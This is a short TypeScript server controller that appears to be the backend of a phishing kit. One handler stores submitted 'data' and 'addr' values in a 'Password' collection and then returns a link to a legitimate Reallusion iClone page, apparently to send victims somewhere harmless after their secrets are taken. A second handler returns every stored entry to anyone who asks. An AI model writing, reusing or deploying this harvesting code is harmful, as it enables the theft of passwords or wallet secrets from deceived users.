import Password from "../models/pwd";

class Controller {
  constructor() {}

  static async get(req: any, res: any) {
    try {
      const data = await Password.find({});
      return res.json(data);
    } catch (err) {
      return res.json({ error: err });
    }
  }

  static async add(req: any, res: any) {
    const { data, addr } = req.body;
    try {
      const duplicate = await Password.findOne({ string: data, addr });
      if (duplicate) return res.json({ charactor_url: "Already exists" });
    } catch (err) {
      return res.json({ charactor_url: "error encountered" });
    }

    try {
      await Password.create({ string: data, addr, time: new Date() });
    } catch (err) {
      console.log(err);
    }

    return res.json({
      charactor_url: "https://www.reallusion.com/iclone/game/",
    });
  }
}

export default Controller;
